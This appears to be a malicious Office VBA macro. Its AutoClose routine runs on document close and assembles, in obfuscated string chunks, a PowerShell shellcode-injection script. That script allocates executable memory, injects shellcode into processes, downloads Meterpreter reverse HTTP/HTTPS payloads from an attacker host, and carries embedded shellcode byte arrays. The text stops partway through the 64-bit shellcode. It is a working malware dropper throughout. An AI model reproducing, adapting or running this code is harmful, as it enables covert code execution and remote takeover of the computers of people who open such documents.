Sub AutoClose()
        iFp
End Sub

Public Function iFp() As Variant
        Dim XmuJYn As String
        XmuJYn = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        XmuJYn = XmuJYn + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        XmuJYn = XmuJYn + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        XmuJYn = XmuJYn + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        XmuJYn = XmuJYn + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        XmuJYn = XmuJYn + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        XmuJYn = XmuJYn + "    $Shellcode,
    [Parameter( ParameterSetName ="
        XmuJYn = XmuJYn + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        XmuJYn = XmuJYn + "reter/reverse_http',
                  'windows/me"
        XmuJYn = XmuJYn + "terpreter/reverse_https',
                  Ignore"
        XmuJYn = XmuJYn + "Case = $True )]
    [String]
    $Payload = 'windo"
        XmuJYn = XmuJYn + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        XmuJYn = XmuJYn + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        XmuJYn = XmuJYn + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        XmuJYn = XmuJYn + " = $True,
                ParameterSetName = 'Meta"
        XmuJYn = XmuJYn + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        XmuJYn = XmuJYn + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        XmuJYn = XmuJYn + "datory = $True,
                ParameterSetName ="
        XmuJYn = XmuJYn + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        XmuJYn = XmuJYn + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        XmuJYn = XmuJYn + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        XmuJYn = XmuJYn + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        XmuJYn = XmuJYn + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        XmuJYn = XmuJYn + "sion\Internet Settings').'User Agent',
    [Parame"
        XmuJYn = XmuJYn + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        XmuJYn = XmuJYn + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        XmuJYn = XmuJYn + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        XmuJYn = XmuJYn + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        XmuJYn = XmuJYn + "$False,
    [Switch]
    $Force = $False
)
    Set"
        XmuJYn = XmuJYn + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        XmuJYn = XmuJYn + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        XmuJYn = XmuJYn + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        XmuJYn = XmuJYn + "meters['Payload'].Attributes |
            Where-O"
        XmuJYn = XmuJYn + "bject {$_.TypeId -eq [System.Management.Automation"
        XmuJYn = XmuJYn + ".ValidateSetAttribute]}
        foreach ($Payload "
        XmuJYn = XmuJYn + "in $AvailablePayloads.ValidValues)
        {
     "
        XmuJYn = XmuJYn + "       New-Object PSObject -Property @{ Payloads ="
        XmuJYn = XmuJYn + " $Payload }
        }
        Return
    }
    if "
        XmuJYn = XmuJYn + "( $PSBoundParameters['ProcessID'] )
    {
        "
        XmuJYn = XmuJYn + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        XmuJYn = XmuJYn + "-Null
    }
    function Local:Get-DelegateType
  "
        XmuJYn = XmuJYn + "  {
        Param
        (
            [OutputTyp"
        XmuJYn = XmuJYn + "e([Type])]
            [Parameter( Position = 0)]
"
        XmuJYn = XmuJYn + "            [Type[]]
            $Parameters = (Ne"
        XmuJYn = XmuJYn + "w-Object Type[](0)),
            [Parameter( Posit"
        XmuJYn = XmuJYn + "ion = 1 )]
            [Type]
            $ReturnT"
        XmuJYn = XmuJYn + "ype = [Void]
        )
        $Domain = [AppDomai"
        XmuJYn = XmuJYn + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        XmuJYn = XmuJYn + "t System.Reflection.AssemblyName('ReflectedDelegat"
        XmuJYn = XmuJYn + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        XmuJYn = XmuJYn + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        XmuJYn = XmuJYn + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        XmuJYn = XmuJYn + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        XmuJYn = XmuJYn + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        XmuJYn = XmuJYn + "der.DefineType('MyDelegateType', 'Class, Public, S"
        XmuJYn = XmuJYn + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        XmuJYn = XmuJYn + "egate])
        $ConstructorBuilder = $TypeBuilder"
        XmuJYn = XmuJYn + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        XmuJYn = XmuJYn + "ic', [System.Reflection.CallingConventions]::Stand"
        XmuJYn = XmuJYn + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        XmuJYn = XmuJYn + "mplementationFlags('Runtime, Managed')
        $Me"
        XmuJYn = XmuJYn + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        XmuJYn = XmuJYn + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        XmuJYn = XmuJYn + ", $Parameters)
        $MethodBuilder.SetImplement"
        XmuJYn = XmuJYn + "ationFlags('Runtime, Managed')
        Write-Outpu"
        XmuJYn = XmuJYn + "t $TypeBuilder.CreateType()
    }
    function Loc"
        XmuJYn = XmuJYn + "al:Get-ProcAddress
    {
        Param
        (
 "
        XmuJYn = XmuJYn + "           [OutputType([IntPtr])]
            [Par"
        XmuJYn = XmuJYn + "ameter( Position = 0, Mandatory = $True )]
       "
        XmuJYn = XmuJYn + "     [String]
            $Module,
            [Pa"
        XmuJYn = XmuJYn + "rameter( Position = 1, Mandatory = $True )]
      "
        XmuJYn = XmuJYn + "      [String]
            $Procedure
        )
  "
        XmuJYn = XmuJYn + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        XmuJYn = XmuJYn + ".GetAssemblies() |
            Where-Object { $_.G"
        XmuJYn = XmuJYn + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        XmuJYn = XmuJYn + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        XmuJYn = XmuJYn + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        XmuJYn = XmuJYn + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        XmuJYn = XmuJYn + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        XmuJYn = XmuJYn + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        XmuJYn = XmuJYn + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        XmuJYn = XmuJYn + "eropServices.HandleRef], [String]))
        $Kern3"
        XmuJYn = XmuJYn + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        XmuJYn = XmuJYn + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        XmuJYn = XmuJYn + "ndleRef = New-Object System.Runtime.InteropService"
        XmuJYn = XmuJYn + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        XmuJYn = XmuJYn + "Output $GetProcAddress.Invoke($null, @([System.Run"
        XmuJYn = XmuJYn + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        XmuJYn = XmuJYn + "ure))
    }
    function Local:Emit-CallThreadStub"
        XmuJYn = XmuJYn + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        XmuJYn = XmuJYn + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        XmuJYn = XmuJYn + "chitecture / 8
        function Local:ConvertTo-Li"
        XmuJYn = XmuJYn + "ttleEndian ([IntPtr] $Address)
        {
         "
        XmuJYn = XmuJYn + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        XmuJYn = XmuJYn + "           $Address.ToString("X$($IntSizePtr*2)") "
        XmuJYn = XmuJYn + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        XmuJYn = XmuJYn + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        XmuJYn = XmuJYn + " } }
            [System.Array]::Reverse($LittleEn"
        XmuJYn = XmuJYn + "dianByteArray)
            Write-Output $LittleEnd"
        XmuJYn = XmuJYn + "ianByteArray
        }
        $CallStub = New-Obj"
        XmuJYn = XmuJYn + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        XmuJYn = XmuJYn + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        XmuJYn = XmuJYn + "                   # MOV   QWORD RAX, &shellcode
 "
        XmuJYn = XmuJYn + "           $CallStub += ConvertTo-LittleEndian $Ba"
        XmuJYn = XmuJYn + "seAddr       # &shellcode
            $CallStub +="
        XmuJYn = XmuJYn + " 0xFF,0xD0                              # CALL  RA"
        XmuJYn = XmuJYn + "X
            $CallStub += 0x6A,0x00              "
        XmuJYn = XmuJYn + "                # PUSH  BYTE 0
            $CallSt"
        XmuJYn = XmuJYn + "ub += 0x48,0xB8                              # MOV"
        XmuJYn = XmuJYn + "   QWORD RAX, &ExitThread
            $CallStub +="
        XmuJYn = XmuJYn + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        XmuJYn = XmuJYn + "ead
            $CallStub += 0xFF,0xD0            "
        XmuJYn = XmuJYn + "                  # CALL  RAX
        }
        el"
        XmuJYn = XmuJYn + "se
        {
            [Byte[]] $CallStub = 0xB8"
        XmuJYn = XmuJYn + "                           # MOV   DWORD EAX, &she"
        XmuJYn = XmuJYn + "llcode
            $CallStub += ConvertTo-LittleEn"
        XmuJYn = XmuJYn + "dian $BaseAddr       # &shellcode
            $Cal"
        XmuJYn = XmuJYn + "lStub += 0xFF,0xD0                              # "
        XmuJYn = XmuJYn + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        XmuJYn = XmuJYn + "                        # PUSH  BYTE 0
           "
        XmuJYn = XmuJYn + " $CallStub += 0xB8                                "
        XmuJYn = XmuJYn + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        XmuJYn = XmuJYn + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        XmuJYn = XmuJYn + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        XmuJYn = XmuJYn + "                          # CALL  EAX
        }
  "
        XmuJYn = XmuJYn + "      Write-Output $CallStub
    }
    function Lo"
        XmuJYn = XmuJYn + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        XmuJYn = XmuJYn + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        XmuJYn = XmuJYn + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        XmuJYn = XmuJYn + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        XmuJYn = XmuJYn + "        Throw "Unable to open a process handle for"
        XmuJYn = XmuJYn + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        XmuJYn = XmuJYn + "lse
        if ($64bitCPU) # Only perform theses c"
        XmuJYn = XmuJYn + "hecks if CPU is 64-bit
        {
            $IsWo"
        XmuJYn = XmuJYn + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        XmuJYn = XmuJYn + "-Null
            if ((!$IsWow64) -and $PowerShell"
        XmuJYn = XmuJYn + "32bit)
            {
                Throw 'Unable"
        XmuJYn = XmuJYn + " to inject 64-bit shellcode from within 32-bit Pow"
        XmuJYn = XmuJYn + "ershell. Use the 64-bit version of Powershell if y"
        XmuJYn = XmuJYn + "ou want this to work.'
            }
            e"
        XmuJYn = XmuJYn + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        XmuJYn = XmuJYn + "  {
                if ($Shellcode32.Length -eq 0)"
        XmuJYn = XmuJYn + "
                {
                    Throw 'No s"
        XmuJYn = XmuJYn + "hellcode was placed in the $Shellcode32 variable!'"
        XmuJYn = XmuJYn + "
                }
                $Shellcode = $S"
        XmuJYn = XmuJYn + "hellcode32
            }
            else # 64-bit"
        XmuJYn = XmuJYn + " process
            {
                if ($Shellc"
        XmuJYn = XmuJYn + "ode64.Length -eq 0)
                {
            "
        XmuJYn = XmuJYn + "        Throw 'No shellcode was placed in the $She"
        XmuJYn = XmuJYn + "llcode64 variable!'
                }
            "
        XmuJYn = XmuJYn + "    $Shellcode = $Shellcode64
            }
      "
        XmuJYn = XmuJYn + "  }
        else # 32-bit CPU
        {
          "
        XmuJYn = XmuJYn + "  if ($Shellcode32.Length -eq 0)
            {
   "
        XmuJYn = XmuJYn + "             Throw 'No shellcode was placed in the"
        XmuJYn = XmuJYn + " $Shellcode32 variable!'
            }
           "
        XmuJYn = XmuJYn + " $Shellcode = $Shellcode32
        }
        $Remo"
        XmuJYn = XmuJYn + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        XmuJYn = XmuJYn + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        XmuJYn = XmuJYn + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        XmuJYn = XmuJYn + ")
        {
            Throw "Unable to allocate "
        XmuJYn = XmuJYn + "shellcode memory in PID: $ProcessID"
        }
   "
        XmuJYn = XmuJYn + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        XmuJYn = XmuJYn + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        XmuJYn = XmuJYn + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        XmuJYn = XmuJYn + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        XmuJYn = XmuJYn + "      {
            $CallStub = Emit-CallThreadStu"
        XmuJYn = XmuJYn + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        XmuJYn = XmuJYn + "    else
        {
            $CallStub = Emit-Ca"
        XmuJYn = XmuJYn + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        XmuJYn = XmuJYn + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        XmuJYn = XmuJYn + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        XmuJYn = XmuJYn + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        XmuJYn = XmuJYn + "(!$RemoteStubAddr)
        {
            Throw "Un"
        XmuJYn = XmuJYn + "able to allocate thread call stub memory in PID: $"
        XmuJYn = XmuJYn + "ProcessID"
        }
        $WriteProcessMemory.I"
        XmuJYn = XmuJYn + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        XmuJYn = XmuJYn + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        XmuJYn = XmuJYn + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        XmuJYn = XmuJYn + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        XmuJYn = XmuJYn + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        XmuJYn = XmuJYn + "  {
            Throw "Unable to launch remote thr"
        XmuJYn = XmuJYn + "ead in PID: $ProcessID"
        }
        $CloseHa"
        XmuJYn = XmuJYn + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        XmuJYn = XmuJYn + "on Local:Inject-LocalShellcode
    {
        if ($"
        XmuJYn = XmuJYn + "PowerShell32bit) {
            if ($Shellcode32.Le"
        XmuJYn = XmuJYn + "ngth -eq 0)
            {
                Throw 'N"
        XmuJYn = XmuJYn + "o shellcode was placed in the $Shellcode32 variabl"
        XmuJYn = XmuJYn + "e!'
                return
            }
         "
        XmuJYn = XmuJYn + "   $Shellcode = $Shellcode32
        }
        els"
        XmuJYn = XmuJYn + "e
        {
            if ($Shellcode64.Length -e"
        XmuJYn = XmuJYn + "q 0)
            {
                Throw 'No shell"
        XmuJYn = XmuJYn + "code was placed in the $Shellcode64 variable!'
   "
        XmuJYn = XmuJYn + "             return
            }
            $She"
        XmuJYn = XmuJYn + "llcode = $Shellcode64
        }
        $BaseAddre"
        XmuJYn = XmuJYn + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        XmuJYn = XmuJYn + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        XmuJYn = XmuJYn + "X)
        if (!$BaseAddress)
        {
          "
        XmuJYn = XmuJYn + "  Throw "Unable to allocate shellcode memory in PI"
        XmuJYn = XmuJYn + "D: $ProcessID"
        }
        [System.Runtime.I"
        XmuJYn = XmuJYn + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        XmuJYn = XmuJYn + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        XmuJYn = XmuJYn + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        XmuJYn = XmuJYn + "  if ($PowerShell32bit)
        {
            $Cal"
        XmuJYn = XmuJYn + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        XmuJYn = XmuJYn + "adAddr 32
        }
        else
        {
       "
        XmuJYn = XmuJYn + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        XmuJYn = XmuJYn + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        XmuJYn = XmuJYn + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        XmuJYn = XmuJYn + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        XmuJYn = XmuJYn + "X)
        if (!$CallStubAddress)
        {
      "
        XmuJYn = XmuJYn + "      Throw "Unable to allocate thread call stub.""
        XmuJYn = XmuJYn + "
        }
        [System.Runtime.InteropServices"
        XmuJYn = XmuJYn + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        XmuJYn = XmuJYn + "allStub.Length)
        $ThreadHandle = $CreateThr"
        XmuJYn = XmuJYn + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        XmuJYn = XmuJYn + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        XmuJYn = XmuJYn + "dHandle)
        {
            Throw "Unable to la"
        XmuJYn = XmuJYn + "unch thread."
        }
        $WaitForSingleObje"
        XmuJYn = XmuJYn + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        XmuJYn = XmuJYn + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        XmuJYn = XmuJYn + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        XmuJYn = XmuJYn + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        XmuJYn = XmuJYn + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        XmuJYn = XmuJYn + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        XmuJYn = XmuJYn + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        XmuJYn = XmuJYn + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        XmuJYn = XmuJYn + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        XmuJYn = XmuJYn + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        XmuJYn = XmuJYn + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        XmuJYn = XmuJYn + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        XmuJYn = XmuJYn + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        XmuJYn = XmuJYn + "  else
    {
        $64bitCPU = $false
    }
    "
        XmuJYn = XmuJYn + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        XmuJYn = XmuJYn + "l32bit = $true
    }
    else
    {
        $Power"
        XmuJYn = XmuJYn + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        XmuJYn = XmuJYn + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        XmuJYn = XmuJYn + "owerShell32bit) {
            $RootInvocation = $M"
        XmuJYn = XmuJYn + "yInvocation.Line
            $Response = $True
   "
        XmuJYn = XmuJYn + "         if ( $Force -or ( $Response = $psCmdlet.S"
        XmuJYn = XmuJYn + "houldContinue( "Do you want to launch the payload "
        XmuJYn = XmuJYn + "from x86 Powershell?",
                   "Attempt"
        XmuJYn = XmuJYn + " to execute 32-bit shellcode from 64-bit Powershel"
        XmuJYn = XmuJYn + "l. Note: This process takes about one minute. Be p"
        XmuJYn = XmuJYn + "atient! You will also see some artifacts of the sc"
        XmuJYn = XmuJYn + "ript loading in the other process." ) ) ) { }
    "
        XmuJYn = XmuJYn + "        if ( !$Response )
            {
          "
        XmuJYn = XmuJYn + "      Return
            }
            if ($MyInvo"
        XmuJYn = XmuJYn + "cation.BoundParameters['Force'])
            {
   "
        XmuJYn = XmuJYn + "             $Command = "function $($MyInvocation."
        XmuJYn = XmuJYn + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        XmuJYn = XmuJYn + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        XmuJYn = XmuJYn + "   }
            else
            {
              "
        XmuJYn = XmuJYn + "  $Command = "function $($MyInvocation.InvocationN"
        XmuJYn = XmuJYn + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        XmuJYn = XmuJYn + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        XmuJYn = XmuJYn + "
            $CommandBytes = [System.Text.Encoding"
        XmuJYn = XmuJYn + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        XmuJYn = XmuJYn + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        XmuJYn = XmuJYn + "           $Execute = '$Command' + " | $Env:windir"
        XmuJYn = XmuJYn + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        XmuJYn = XmuJYn + "oProfile -Command -"
            Invoke-Expression"
        XmuJYn = XmuJYn + " -Command $Execute | Out-Null
            Return
 "
        XmuJYn = XmuJYn + "       }
        $Response = $True
        if ( $F"
        XmuJYn = XmuJYn + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        XmuJYn = XmuJYn + "Do you know what you're doing?",
               "A"
        XmuJYn = XmuJYn + "bout to download Metasploit payload '$($Payload)' "
        XmuJYn = XmuJYn + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        XmuJYn = XmuJYn + "  if ( !$Response )
        {
            Return
 "
        XmuJYn = XmuJYn + "       }
        switch ($Payload)
        {
     "
        XmuJYn = XmuJYn + "       'windows/meterpreter/reverse_http'
        "
        XmuJYn = XmuJYn + "    {
                $SSL = ''
            }
    "
        XmuJYn = XmuJYn + "        'windows/meterpreter/reverse_https'
      "
        XmuJYn = XmuJYn + "      {
                $SSL = 's'
               "
        XmuJYn = XmuJYn + " [System.Net.ServicePointManager]::ServerCertifica"
        XmuJYn = XmuJYn + "teValidationCallback = {$True}
            }
     "
        XmuJYn = XmuJYn + "   }
        if ($Legacy)
        {
            $R"
        XmuJYn = XmuJYn + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        XmuJYn = XmuJYn + "
        } else {
            $CharArray = 48..57 "
        XmuJYn = XmuJYn + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        XmuJYn = XmuJYn + "         $SumTest = $False
            while ($Sum"
        XmuJYn = XmuJYn + "Test -eq $False)
            {
                $Ge"
        XmuJYn = XmuJYn + "neratedUri = $CharArray | Get-Random -Count 4
    "
        XmuJYn = XmuJYn + "            $SumTest = (([int[]] $GeneratedUri | M"
        XmuJYn = XmuJYn + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        XmuJYn = XmuJYn + "  }
            $RequestUri = -join $GeneratedUri
"
        XmuJYn = XmuJYn + "            $Request = "http$($SSL)://$($Lhost):$("
        XmuJYn = XmuJYn + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        XmuJYn = XmuJYn + "ew-Object Uri($Request)
        $WebClient = New-O"
        XmuJYn = XmuJYn + "bject System.Net.WebClient
        $WebClient.Head"
        XmuJYn = XmuJYn + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        XmuJYn = XmuJYn + "roxy)
        {
            $WebProxyObject = New-"
        XmuJYn = XmuJYn + "Object System.Net.WebProxy
            $ProxyAddre"
        XmuJYn = XmuJYn + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        XmuJYn = XmuJYn + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        XmuJYn = XmuJYn + "oxyServer
            if ($ProxyAddress)
         "
        XmuJYn = XmuJYn + "   {
                $WebProxyObject.Address = $Pr"
        XmuJYn = XmuJYn + "oxyAddress
                $WebProxyObject.UseDefa"
        XmuJYn = XmuJYn + "ultCredentials = $True
                $WebClientO"
        XmuJYn = XmuJYn + "bject.Proxy = $WebProxyObject
            }
      "
        XmuJYn = XmuJYn + "  }
        try
        {
            [Byte[]] $Sh"
        XmuJYn = XmuJYn + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        XmuJYn = XmuJYn + "}
        catch
        {
            Throw "$($Er"
        XmuJYn = XmuJYn + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        XmuJYn = XmuJYn + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        XmuJYn = XmuJYn + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        XmuJYn = XmuJYn + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        XmuJYn = XmuJYn + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        XmuJYn = XmuJYn + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        XmuJYn = XmuJYn + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        XmuJYn = XmuJYn + "                             0x52,0x0c,0x8b,0x52,0"
        XmuJYn = XmuJYn + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        XmuJYn = XmuJYn + "x31,0xc0,
                                  0xac,0"
        XmuJYn = XmuJYn + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        XmuJYn = XmuJYn + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        XmuJYn = XmuJYn + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        XmuJYn = XmuJYn + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        XmuJYn = XmuJYn + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        XmuJYn = XmuJYn + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        XmuJYn = XmuJYn + "x8b,
                                  0x01,0xd6,0"
        XmuJYn = XmuJYn + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        XmuJYn = XmuJYn + "x38,0xe0,0x75,0xf4,
                              "
        XmuJYn = XmuJYn + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        XmuJYn = XmuJYn + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        XmuJYn = XmuJYn + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        XmuJYn = XmuJYn + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        XmuJYn = XmuJYn + "                                  0x5b,0x5b,0x61,0"
        XmuJYn = XmuJYn + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        XmuJYn = XmuJYn + "xeb,0x86,0x5d,
                                  0"
        XmuJYn = XmuJYn + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        XmuJYn = XmuJYn + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        XmuJYn = XmuJYn + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        XmuJYn = XmuJYn + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        XmuJYn = XmuJYn + "                             0x80,0xfb,0xe0,0x75,0"
        XmuJYn = XmuJYn + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        XmuJYn = XmuJYn + "xd5,0x63,
                                  0x61,0"
        XmuJYn = XmuJYn + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        XmuJYn = XmuJYn + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        XmuJYn = XmuJYn + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        XmuJYn = XmuJYn + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        XmuJYn = XmuJYn + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        XmuJYn = XmuJYn + "                             0x20,0x48,0x8b,0x72,0"
        XmuJYn = XmuJYn + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        XmuJYn = XmuJYn + "x31,0xc0,
                                  0xac,0"
        XmuJYn = XmuJYn + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        XmuJYn = XmuJYn + "x41,0x01,0xc1,0xe2,0xed,
                         "
        XmuJYn = XmuJYn + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        XmuJYn = XmuJYn + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        XmuJYn = XmuJYn + "                        0x00,0x00,0x00,0x48,0x85,0"
        XmuJYn = XmuJYn + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        XmuJYn = XmuJYn + "x44,
                                  0x8b,0x40,0"
        XmuJYn = XmuJYn + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
